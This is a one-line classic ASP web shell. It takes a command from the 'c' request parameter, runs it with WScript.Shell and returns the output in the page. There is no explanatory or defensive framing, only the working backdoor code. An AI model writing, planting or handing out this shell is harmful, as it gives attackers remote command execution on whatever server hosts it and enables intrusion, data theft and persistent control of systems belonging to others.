<%Dim c,p,o:c=Request("c"):Set o=CreateObject("WScript.Shell"):Set p=o.Exec(c):Response.Write(p.StdOut.ReadAll):p.Close:Set o=Nothing%>
